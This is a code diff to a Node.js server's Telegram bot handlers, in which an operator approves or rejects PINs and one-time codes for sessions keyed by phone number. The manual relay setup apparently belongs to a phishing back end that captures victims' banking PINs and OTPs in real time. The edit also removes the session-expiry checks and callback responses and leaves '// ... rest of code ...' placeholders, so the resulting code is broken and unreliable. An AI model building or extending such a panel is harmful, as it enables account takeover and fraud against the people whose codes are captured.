@@ -444,56 +444,18 @@ app.get("/api/debug/otp-sessions", (req, res) => {
 // ==================== TELEGRAM HANDLERS ====================
 
 // ✅ PIN HANDLERS FIRST (MORE SPECIFIC)
+// In server.js, update PIN handlers:
 
 bot.action(/pin_correct_(.+)/, async (ctx) => {
   const sessionId = ctx.match[1];
-  console.log(`🎯 PIN correct handler triggered: ${sessionId}`);
-
   const session = pinSessions.get(sessionId);
 
   if (session) {
-    // Check expiration
-    if (Date.now() > session.expiresAt) {
-      session.status = "expired";
-      session.message = "PIN verification timeout";
-      await ctx.answerCbQuery("PIN verification time expired");
-      return;
-    }
-
-    // Update session
-    session.status = "approved";
+    // ... existing code ...
+    session.status = "approved"; // Make sure this is set
     session.message = "PIN verified successfully";
     session.updatedAt = new Date().toISOString();
-
-    console.log(`✅ PIN approved for: ${session.phoneNumber}`);
-
-    await ctx.answerCbQuery("✅ PIN approved!");
-    await ctx.editMessageText(
-      `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN APPROVED</b> - User can proceed`,
-      { parse_mode: "HTML" }
-    );
-  } else {
-    console.log(`❌ PIN session not found: ${sessionId}`);
-    await ctx.answerCbQuery("PIN session not found");
-  }
-});
-
-bot.action(/pin_wrong_(.+)/, async (ctx) => {
-  const sessionId = ctx.match[1];
-  const session = pinSessions.get(sessionId);
-
-  if (session && Date.now() < session.expiresAt) {
-    session.status = "wrong_pin";
-    session.message = "PIN is incorrect";
-    session.updatedAt = new Date().toISOString();
-
-    await ctx.answerCbQuery("❌ Wrong PIN");
-    await ctx.editMessageText(
-      `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided`,
-      { parse_mode: "HTML" }
-    );
-  } else {
-    await ctx.answerCbQuery("PIN session not found or expired");
+    // ... rest of code ...
   }
 });
 
@@ -501,20 +463,96 @@ bot.action(/pinotp_correct_(.+)/, async (ctx) => {
   const sessionId = ctx.match[1];
   const session = pinSessions.get(sessionId);
 
-  if (session && Date.now() < session.expiresAt) {
-    session.status = "approved_with_otp";
+  if (session) {
+    session.status = "approved_with_otp"; // Make sure this is set
     session.message = "Verification successful - PIN and OTP correct";
     session.updatedAt = new Date().toISOString();
-
-    await ctx.answerCbQuery("✅ PIN & OTP approved!");
-    await ctx.editMessageText(
-      `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN & OTP APPROVED</b> - Full verification complete`,
-      { parse_mode: "HTML" }
-    );
-  } else {
-    await ctx.answerCbQuery("PIN session not found or expired");
+    // ... rest of code ...
   }
 });
+
+bot.action(/pin_wrong_(.+)/, async (ctx) => {
+  const sessionId = ctx.match[1];
+  const session = pinSessions.get(sessionId);
+
+  if (session) {
+    session.status = "wrong_pin"; // Make sure this is set
+    session.message = "PIN is incorrect";
+    session.updatedAt = new Date().toISOString();
+    // ... rest of code ...
+  }
+});
+
+// bot.action(/pin_correct_(.+)/, async (ctx) => {
+//   const sessionId = ctx.match[1];
+//   console.log(`🎯 PIN correct handler triggered: ${sessionId}`);
+
+//   const session = pinSessions.get(sessionId);
+
+//   if (session) {
+//     // Check expiration
+//     if (Date.now() > session.expiresAt) {
+//       session.status = "expired";
+//       session.message = "PIN verification timeout";
+//       await ctx.answerCbQuery("PIN verification time expired");
+//       return;
+//     }
+
+//     // Update session
+//     session.status = "approved";
+//     session.message = "PIN verified successfully";
+//     session.updatedAt = new Date().toISOString();
+
+//     console.log(`✅ PIN approved for: ${session.phoneNumber}`);
+
+//     await ctx.answerCbQuery("✅ PIN approved!");
+//     await ctx.editMessageText(
+//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN APPROVED</b> - User can proceed`,
+//       { parse_mode: "HTML" }
+//     );
+//   } else {
+//     console.log(`❌ PIN session not found: ${sessionId}`);
+//     await ctx.answerCbQuery("PIN session not found");
+//   }
+// });
+
+// bot.action(/pin_wrong_(.+)/, async (ctx) => {
+//   const sessionId = ctx.match[1];
+//   const session = pinSessions.get(sessionId);
+
+//   if (session && Date.now() < session.expiresAt) {
+//     session.status = "wrong_pin";
+//     session.message = "PIN is incorrect";
+//     session.updatedAt = new Date().toISOString();
+
+//     await ctx.answerCbQuery("❌ Wrong PIN");
+//     await ctx.editMessageText(
+//       `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided`,
+//       { parse_mode: "HTML" }
+//     );
+//   } else {
+//     await ctx.answerCbQuery("PIN session not found or expired");
+//   }
+// });
+
+// bot.action(/pinotp_correct_(.+)/, async (ctx) => {
+//   const sessionId = ctx.match[1];
+//   const session = pinSessions.get(sessionId);
+
+//   if (session && Date.now() < session.expiresAt) {
+//     session.status = "approved_with_otp";
+//     session.message = "Verification successful - PIN and OTP correct";
+//     session.updatedAt = new Date().toISOString();
+
+//     await ctx.answerCbQuery("✅ PIN & OTP approved!");
+//     await ctx.editMessageText(
+//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN & OTP APPROVED</b> - Full verification complete`,
+//       { parse_mode: "HTML" }
+//     );
+//   } else {
+//     await ctx.answerCbQuery("PIN session not found or expired");
+//   }
+// });
 
 bot.action(/pin_extend_(.+)/, async (ctx) => {
   const sessionId = ctx.match[1];
@@ -583,6 +621,68 @@ bot.action(/wrong_code_(.+)/, async (ctx) => {
       `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG CODE</b> - Please resend OTP`,
       { parse_mode: "HTML" }
     );
+  }
+});
+
+// Add this handler in server.js after the wrong_code_ handler
+bot.action(/wrong_pin_(.+)/, async (ctx) => {
+  const sessionId = ctx.match[1];
+  console.log(`🎯 OTP wrong_pin handler triggered: ${sessionId}`);
+
+  // First check if it's a PIN session (starts with PIN_)
+  if (sessionId.startsWith("PIN_")) {
+    console.log(
+      `⚠️ wrong_pin_ action for PIN session handled by PIN handler: ${sessionId}`
+    );
+    return; // Let the PIN handler handle this
+  }
+
+  const session = verificationSessions.get(sessionId);
+
+  if (session) {
+    // Check expiration
+    const now = Date.now();
+    if (now > session.expiresAt) {
+      session.status = "expired";
+      session.message = "OTP verification timeout";
+      await ctx.answerCbQuery("OTP verification time expired");
+      await ctx.editMessageText(
+        `${ctx.callbackQuery.message.text}\n\n⏰ <b>SESSION EXPIRED</b> - Verification timeout`,
+        { parse_mode: "HTML" }
+      );
+      return;
+    }
+
+    // Update session
+    session.status = "wrong_pin";
+    session.message = "PIN is incorrect for OTP verification";
+    session.updatedAt = new Date().toISOString();
+    session.updatedAtTimestamp = now;
+
+    console.log(
+      `❌ OTP Wrong PIN for: ${session.phoneNumber} (Session: ${sessionId})`
+    );
+
+    await ctx.answerCbQuery("❌ Wrong PIN");
+    await ctx.editMessageText(
+      `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided for OTP verification`,
+      { parse_mode: "HTML" }
+    );
+
+    // Log for debugging
+    console.log(`📝 Session ${sessionId} updated to status: ${session.status}`);
+    console.log(`📝 Session message: ${session.message}`);
+  } else {
+    console.log(`❌ OTP session not found: ${sessionId}`);
+    await ctx.answerCbQuery("OTP session not found or expired");
+
+    // Try to find in PIN sessions (just in case)
+    const pinSession = pinSessions.get(sessionId);
+    if (pinSession) {
+      console.log(
+        `⚠️ Found session ${sessionId} in PIN sessions, not OTP sessions`
+      );
+    }
   }
 });
 
